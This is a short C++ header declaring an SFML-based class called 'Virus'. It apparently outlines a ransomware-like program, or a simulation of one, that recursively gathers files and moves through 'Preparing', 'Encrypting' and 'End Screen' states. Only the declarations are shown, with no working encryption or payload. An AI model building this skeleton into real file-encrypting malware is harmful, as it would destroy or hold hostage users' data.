#include "SFML/Graphics.hpp"
#include <filesystem>
#include <iostream>

namespace fs = std::filesystem;
using namespace sf;
class Virus
{
private:
    RenderWindow &window;
    RectangleShape bar;
    Text tx, proc, rest, prep, disp_count, ybh;
    Font ft;
    int count;
    Clock clock;
    void preparing();
    void encrypting();
    void end_screen();
    bool checking(fs::directory_entry entry);
    void start_rec(fs::directory_entry it);
    int state = 0; // 0 - Preparing; 1 - Encrypting; 2 - End Screen
    bool is_red = true;
    std::vector<std::string> files;
    float tick = 0.f;
public:
    Virus(RenderWindow &window);
    void loop();
    void event();
};